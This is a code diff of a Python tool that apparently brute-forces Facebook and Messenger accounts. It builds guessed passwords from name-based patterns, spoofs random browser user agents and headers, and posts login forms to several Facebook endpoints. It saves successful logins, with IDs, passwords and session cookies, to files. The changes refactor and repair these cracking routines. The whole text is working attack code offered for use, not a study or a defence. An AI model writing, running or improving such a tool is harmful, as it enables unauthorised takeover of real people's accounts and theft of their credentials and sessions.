@@ -341,9 +341,12 @@ def uaku():
             ua.write(un + "\n")
         ua = open(".bbnew.txt", "r").read().splitlines()
 
-uaa = open("Useragent.txt", "r").read().splitlines()
-for ub in uaa:
-    uabb.append(ub)
+try:
+    uaa = open("Useragent.txt", "r").read().splitlines()
+    for ub in uaa:
+        uabb.append(ub)
+except:
+    pass
 
 # ------------[ INDICATION ]---------------#
 M2 = "[#FF0000]"  # MERAH
@@ -1636,7 +1639,7 @@ def setting():
 		exit()
 	Console().print(
 		Panel(
-            f"{P2}[{color_text}01{P2}] Login Site [bold green]mbasic.facebook.com[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]validate.facebook.com[bold white]\n{P2}[{color_text}03{P2}] Login Site [bold green]reguler.facebook.com[bold white]\n{P2}[{color_text}04{P2}] Login Site [bold green]regulerv2.facebook.com[bold white] [/]\n{P2}[{color_text}05{P2}] Login Site [bold green]async.facebook.com[bold white] [/]",
+            f"{P2}[{color_text}01{P2}] Login Site [bold green]mbasic.facebook.com[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]validate.facebook.com[bold white]\n{P2}[{color_text}03{P2}] Login Site [bold green]reguler.facebook.com[bold white]\n{P2}[{color_text}04{P2}] Login Site [bold green]m_alpha masengger[bold white] [/]\n{P2}[{color_text}05{P2}] Login Site [bold green]async.facebook.com[bold white] [/]",
             width=60,
             style=f"{color_panel}",
             title="[bold green] Method"))
@@ -1668,7 +1671,7 @@ def setting():
 		ualu.append(bzer)
 	else:
 		ualuh.append("tidak")
-	Console().print(Panel(f"{P2}[{color_text}01{P2}] metode Slow {H2}[Recomend]{P2}\n{P2}[{color_text}02{P2}] method cepat{P2}",width=60,style=f"{color_panel}"))
+	Console().print(Panel(f"{P2}[{color_text}01{P2}] metode Slow {H2}[Recomended]{P2}\n{P2}[{color_text}02{P2}] method cepat{P2}",width=60,style=f"{color_panel}"))
 	hc = console.input(f" {H2}• {P2}Masukan : ")
 	if hc in ["1", "01"]:
 		metslow()
@@ -1781,7 +1784,7 @@ def metslow():
                 elif "mbasik" in method:
                     pool.submit(mobile, idf, pwv)
                 elif "regulerv2" in method:
-                    pool.submit(regulerv2, idf, pwv)
+                    pool.submit(main_alpha, idf, pwv)
                 else:
                     pool.submit(mobile, idf, pwv)
     print("")
@@ -1838,7 +1841,6 @@ def metcepat():
                         pwv.append(frs+'1234')
                         pwv.append(frs+'12345')
                         pwv.append(frs+'123456')
-                        pwv.append(frs+'1234567')
                 if 'ya' in pwpluss: 
                     for xpwd in pwnya:
                         pwv.append(xpwd)
@@ -1872,29 +1874,30 @@ def metcepat():
 
 # Crack Dengan Metode Messenger
 def main_alpha(idf, pwv):
-	global Looping, Ok, Cp,loop, ok, cp
+	global loop, ok, cp
 	r = requests.Session()
+	acak_device = random.choice(['Windows NT 10.0; Win64; x64', 'Windows NT 10.0; WOW64', 'Windows NT 10.0', 'Macintosh; Intel Mac OS X 13_2', 'X11; Linux x86_64'])
+	browser_version = (f'{random.randrange(90, 108)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
+	useragent = ('Mozilla/5.0 ({}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(acak_device, browser_version))
 	prog.update(des,description=f" {K2}•{H2} M_ALPHA {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
 	for pw in pwv:
 		try:
-			acak_device = random.choice(['Windows NT 10.0; Win64; x64', 'Windows NT 10.0; WOW64', 'Windows NT 10.0', 'Macintosh; Intel Mac OS X 13_2', 'X11; Linux x86_64'])
-			browser_version = (f'{random.randrange(90, 108)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
-			useragent = ('Mozilla/5.0 ({}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(acak_device, browser_version))
+			if "ya" in ualuh: useragent = ualu[0]
 			r.headers.update({
-                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                    'accept-language': 'en-US,en;q=0.9',
-                    'connection': 'keep-alive',
-                    'Host': 'www.alpha.messenger.com',
-                    'sec-fetch-user': '?1',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-fetch-dest': 'document',
-                    'sec-fetch-mode': 'navigate',
-                    'sec-fetch-site': 'none',
-                    'upgrade-insecure-requests': '1',
-                    'user-agent': useragent,
-                    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="{}", "Chromium";v="{}"'.format(re.search('Chrome/(\d+).', str(useragent)).group(1), re.search('Chrome/(\d+).', str(useragent)).group(1)),
-			})
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': 'en-US,en;q=0.9',
+                'connection': 'keep-alive',
+                'Host': 'www.alpha.messenger.com',
+                'sec-fetch-user': '?1',
+                'sec-ch-ua-mobile': '?0',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'none',
+                'upgrade-insecure-requests': '1',
+                'user-agent': useragent,
+                'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="{}", "Chromium";v="{}"'.format(re.search('Chrome/(\d+).', str(useragent)).group(1), re.search('Chrome/(\d+).', str(useragent)).group(1)),
+                })
 			response = r.get('https://www.alpha.messenger.com/').text
 			try:
 				jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
@@ -1905,34 +1908,12 @@ def main_alpha(idf, pwv):
 				_js_datr = re.search('"_js_datr","(.*?)"', str(response)).group(1)
 			except (AttributeError):
 				print("[bold white][[bold yellow]![bold white]][bold yellow] AttributeError...                            ", end='\r');time.sleep(1.0);continue
-			r.headers.update({
-                    'origin': 'https://www.alpha.messenger.com',
-                    'sec-fetch-site': 'same-origin',
-                    'referer': 'https://www.alpha.messenger.com/',
-                    'cache-control': 'max-age=0',
-                    'cookie': '_js_datr={}; wd=1280x601; dpr=1.5'.format(_js_datr),
-                    'accept-encoding': 'gzip, deflate, br',
-                    'content-type': 'application/x-www-form-urlencoded',
-			})
-			data = {
-                    'jazoest': jazoest,
-                    'lsd': lsd,
-                    'initial_request_id': initial_request_id,
-                    'timezone': '-420',
-                    'lgndim': '',
-                    'lgnrnd': lgnrnd,
-                    'lgnjs': lgnjs,
-                    'email': idf,
-                    'pass': pw,
-                    'login': '1',
-                    'persistent': '1',
-                    'default_persistent': '',
-			}
+			r.headers.update({'origin': 'https://www.alpha.messenger.com','sec-fetch-site': 'same-origin','referer': 'https://www.alpha.messenger.com/','cache-control': 'max-age=0','cookie': '_js_datr={}; wd=1280x601; dpr=1.5'.format(_js_datr),'accept-encoding': 'gzip, deflate, br','content-type': 'application/x-www-form-urlencoded'})
+			data = {'jazoest': jazoest,'lsd': lsd,'initial_request_id': initial_request_id,'timezone': '-420','lgndim': '','lgnrnd': lgnrnd,'lgnjs': lgnjs,'email': idf,'pass': pw,'login': '1','persistent': '1','default_persistent': ''}
 			response2 = r.post('https://www.alpha.messenger.com/login/password/', data = data, allow_redirects = True)
-			#open('Data/Response.txt', 'a').write(f'{email}<=>{password}<=>{r.cookies.get_dict()}<=>{response2.url}\n')
 			if 'c_user' in r.cookies.get_dict():
 				ok += 1
-				coki = po.cookies.get_dict()
+				coki = response2.cookies.get_dict()
 				kuki = (";").join(["%s=%s" % (key, value)for key, value in ses.cookies.get_dict().items()])
 				tree = Tree(f"  ")
 				tree.add(f"[green]{idf}").add(f"[green]{pw}").add(f"[green]{useragent}\n")
@@ -1959,7 +1940,7 @@ def mobile(idf, pwv):
     global loop, ok, cp
     bo = random.choice([m, k, h, b, u, x])
     ua = random.choice(prem)
-    # ua2 = ("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59")
+    ua2 = ("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59")
     ses = requests.Session()
     prog.update(des,description=f" {K2}•{H2} MOBILE {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
     prog.advance(des)
@@ -1967,8 +1948,7 @@ def mobile(idf, pwv):
         try:
             if "ya" in ualuh:
                 ua = ualu[0]
-            ses.headers.update(
-                {
+            ses.headers.update({
                     "Host": "m.facebook.com",
                     "cache-control": "max-age=0",
                     "sec-ch-ua-mobile": "?1",
@@ -1978,25 +1958,19 @@ def mobile(idf, pwv):
                     "sec-fetch-site": "same-origin",
                     "sec-fetch-mode": "cors",
                     "sec-fetch-dest": "empty",
-                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-                }
-            )
+                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
             p = ses.get(
                 "https://m.facebook.com/login.php?skip_api_login=1&api_key=281257358716694&kid_directed_site=0&app_id=281257358716694&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D281257358716694%26cbt%3D1696321674146%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ca3c4178a6c94%2526domain%253Dwww.klook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.klook.com%25252Ffd3a37858b2db8%2526relation%253Dopener%26client_id%3D281257358716694%26display%3Dtouch%26domain%3Dwww.klook.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.klook.com%252Fen-MY%252Faccount%252F%26locale%3Den_US%26logger_id%3Df64c19c8aa5b84%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df28511642d1973c%2526domain%253Dwww.klook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.klook.com%25252Ffd3a37858b2db8%2526relation%253Dopener%2526frame%253Df2d6ce58cf48a5c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv11.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df28511642d1973c%26domain%3Dwww.klook.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.klook.com%252Ffd3a37858b2db8%26relation%3Dopener%26frame%3Df2d6ce58cf48a5c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"
             )
             dataa = {
                 "lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
-                "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(
-                    1
-                ),
+                "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
                 "uid": idf,
                 "next": "https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
                 "flow": "login_no_pin",
                 "pass": pw,
             }
-            koki = (";").join(
-                ["%s=%s" % (key, value) for key, value in p.cookies.get_dict().items()]
-            )
+            koki = (";").join(["%s=%s" % (key, value) for key, value in p.cookies.get_dict().items()])
             koki += " m_pixel_ratio=2.625; wd=412x756"
             heade = {
                 "Host": "m.facebook.com",
@@ -2024,7 +1998,7 @@ def mobile(idf, pwv):
                 headers=heade,
                 allow_redirects=False,
             )
-            if "checkpoint" in po.cookies.get_dict().keys():
+            if "checkpoint" in ses.cookies.get_dict().keys():
                 tree = Tree(f" ")
                 tree.add(f"[red]{idf}").add(f"[red]{pw}")
                 tree.add(f"[red]{ua}\n")
@@ -2036,12 +2010,7 @@ def mobile(idf, pwv):
             elif "c_user" in ses.cookies.get_dict().keys():
                 ok += 1
                 coki = po.cookies.get_dict()
-                kuki = (";").join(
-                    [
-                        "%s=%s" % (key, value)
-                        for key, value in ses.cookies.get_dict().items()
-                    ]
-                )
+                kuki = (";").join(["%s=%s" % (key, value)for key, value in ses.cookies.get_dict().items()])
                 tree = Tree(f"  ")
                 tree.add(f"[green]{idf}").add(f"[green]{pw}").add(f"[green]{ua}\n")
                 tree.add(f"[green]{kuki}\n")
@@ -2049,7 +2018,6 @@ def mobile(idf, pwv):
                 open("OK/" + okc, "a").write(idf + "|" + pw + "|" + ua + "\n")
                 cek_apk(kuki)
                 break
-
             else:
                 continue
         except requests.exceptions.ConnectionError:
@@ -2091,21 +2059,7 @@ def mbasic(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				ok += 1
 				coki = po.cookies.get_dict()
-				kuki = (
-                    "datr="
-                    + coki["datr"]
-                    + ";"
-                    + ("sb=" + coki["sb"])
-                    + ";"
-                    + "locale=id_ID"
-                    + ";"
-                    + ("c_user=" + coki["c_user"])
-                    + ";"
-                    + ("xs=" + coki["xs"])
-                    + ";"
-                    + ("fr=" + coki["fr"])
-                    + ";"
-                )
+				kuki = ("datr="+ coki["datr"]+ ";"+ ("sb=" + coki["sb"])+ ";"+ "locale=id_ID"+ ";"+ ("c_user=" + coki["c_user"])+ ";"+ ("xs=" + coki["xs"])+ ";"+ ("fr=" + coki["fr"])+ ";")
 				tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
 				tree.add(Panel.fit(f"{H2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
 				tree.add(Panel(f"{H2}{ua}{P2}", style=f"{color_panel}"))
@@ -2166,21 +2120,7 @@ def regulerv2(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				ok += 1
 				coki = po.cookies.get_dict()
-				kuki = (
-                    "datr="
-                    + coki["datr"]
-                    + ";"
-                    + ("sb=" + coki["sb"])
-                    + ";"
-                    + "locale=id_ID"
-                    + ";"
-                    + ("c_user=" + coki["c_user"])
-                    + ";"
-                    + ("xs=" + coki["xs"])
-                    + ";"
-                    + ("fr=" + coki["fr"])
-                    + ";"
-                )
+				kuki = ("datr="+ coki["datr"]+ ";"+ ("sb=" + coki["sb"])+ ";"+ "locale=id_ID"+ ";"+ ("c_user=" + coki["c_user"])+ ";"+ ("xs=" + coki["xs"])+ ";"+ ("fr=" + coki["fr"])+ ";")
 				tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
 				tree.add(Panel.fit(f"{H2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
 				tree.add(Panel(f"{H2}{ua}{P2}", style=f"{color_panel}"))
@@ -2201,15 +2141,11 @@ def validate(idf, pwv):
     ua = random.choice(prem)
     ua2 = ("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59")
     ses = requests.Session()
-    prog.update(
-        des,
-        description=f" {K2}•{H2} VALIDATE {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]",
-    )
+    prog.update(des,description=f" {K2}•{H2} VALIDATE {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
     prog.advance(des)
     for pw in pwv:
         try:
-            if "ya" in ualuh:
-                ua = ualu[0]
+            if "ya" in ualuh:ua = ualu[0]
             ses.headers.update(
                 {
                     "Host": "m.facebook.com",
@@ -2229,9 +2165,7 @@ def validate(idf, pwv):
             )
             dataa = {
                 "lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
-                "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(
-                    1
-                ),
+                "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
                 "uid": idf,
                 "next": "https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
                 "flow": "login_no_pin",
@@ -2496,7 +2430,7 @@ def reguler(idf,pwv,url):
 	for pw in pwv:
 		pw = pw.lower()
 		try:
-			memek = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=3446862972255280&kid_directed_site=0&app_id=3446862972255280&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&display=touch&locale=jv_ID&pl_dbl=0&refsrc=deprecated&_rdr")
+			memek = ses.get(f"https://m.facebook.com/login.php?skip_api_login=1&api_key=281257358716694&kid_directed_site=0&app_id=281257358716694&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D281257358716694%26cbt%3D1696321674146%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ca3c4178a6c94%2526domain%253Dwww.klook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.klook.com%25252Ffd3a37858b2db8%2526relation%253Dopener%26client_id%3D281257358716694%26display%3Dtouch%26domain%3Dwww.klook.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.klook.com%252Fen-MY%252Faccount%252F%26locale%3Den_US%26logger_id%3Df64c19c8aa5b84%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df28511642d1973c%2526domain%253Dwww.klook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.klook.com%25252Ffd3a37858b2db8%2526relation%253Dopener%2526frame%253Df2d6ce58cf48a5c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv11.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df28511642d1973c%26domain%3Dwww.klook.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.klook.com%252Ffd3a37858b2db8%26relation%3Dopener%26frame%3Df2d6ce58cf48a5c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
 			date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(memek.text)).group(1),
 'li': re.search('name="li" value="(.*?)"',str(memek.text)).group(1),
 'try_number': '0',
@@ -2534,15 +2468,15 @@ def reguler(idf,pwv,url):
 "sec-ch-prefers-color-scheme": "dark",
 "sec-ch-ua-platform": '"Android"',
 "accept": "*/*",
-"origin": "https://"+url,
+"origin": "https://m.facebook.com",
 "sec-fetch-site": "same-origin",
 "sec-fetch-mode": "navigate",
 "sec-fetch-dest": "document",
-"referer": f"https://{url}/login.php?skip_api_login=1&api_key=3446862972255280&kid_directed_site=0&app_id=3446862972255280&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&display=touch&locale=jv_ID&pl_dbl=0&refsrc=deprecated&_rdr",
+"referer": f"https://m.facebook.com/login.php?skip_api_login=1&api_key=281257358716694&kid_directed_site=0&app_id=281257358716694&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D281257358716694%26cbt%3D1696321674146%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ca3c4178a6c94%2526domain%253Dwww.klook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.klook.com%25252Ffd3a37858b2db8%2526relation%253Dopener%26client_id%3D281257358716694%26display%3Dtouch%26domain%3Dwww.klook.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.klook.com%252Fen-MY%252Faccount%252F%26locale%3Den_US%26logger_id%3Df64c19c8aa5b84%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df28511642d1973c%2526domain%253Dwww.klook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.klook.com%25252Ffd3a37858b2db8%2526relation%253Dopener%2526frame%253Df2d6ce58cf48a5c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv11.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df28511642d1973c%26domain%3Dwww.klook.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.klook.com%252Ffd3a37858b2db8%26relation%3Dopener%26frame%3Df2d6ce58cf48a5c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
 "accept-encoding": "gzip, deflate, br",
 "sec-websocket-version": str(rr(5,13)),
 "accept-language":"id-ID,id;q=0.9"}
-			po = ses.post(f'https://{url}/login/device-based/login/async/?api_key=3446862972255280&auth_token=f302da384cd8cc53013e453112408164&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&refsrc=deprecated&app_id=3446862972255280&cancel=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&lwv=100', headers=head, data=date, allow_redirects=False)
+			po = ses.post(f'https://m.facebook.com/login/device-based/login/async/?api_key=281257358716694&auth_token=84164ca10e580d8847aa35c526767318&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D281257358716694%26cbt%3D1696321674146%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ca3c4178a6c94%2526domain%253Dwww.klook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.klook.com%25252Ffd3a37858b2db8%2526relation%253Dopener%26client_id%3D281257358716694%26display%3Dtouch%26domain%3Dwww.klook.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.klook.com%252Fen-MY%252Faccount%252F%26locale%3Den_US%26logger_id%3Df64c19c8aa5b84%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df28511642d1973c%2526domain%253Dwww.klook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.klook.com%25252Ffd3a37858b2db8%2526relation%253Dopener%2526frame%253Df2d6ce58cf48a5c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv11.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=281257358716694&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df28511642d1973c%26domain%3Dwww.klook.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.klook.com%252Ffd3a37858b2db8%26relation%3Dopener%26frame%3Df2d6ce58cf48a5c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&ht_token=Abso14XhUuId63--yMa6Yg3WkgAUs4Q1vSl3LeIjVVsSHDYI&h_consent=1&ht_l=login&lwv=100', headers=head, data=date, allow_redirects=False)
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				cp += 1
 				tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
@@ -2557,21 +2491,7 @@ def reguler(idf,pwv,url):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				ok += 1
 				coki = po.cookies.get_dict()
-				kuki = (
-                    "datr="
-                    + coki["datr"]
-                    + ";"
-                    + ("sb=" + coki["sb"])
-                    + ";"
-                    + "locale=id_ID"
-                    + ";"
-                    + ("c_user=" + coki["c_user"])
-                    + ";"
-                    + ("xs=" + coki["xs"])
-                    + ";"
-                    + ("fr=" + coki["fr"])
-                    + ";"
-				)
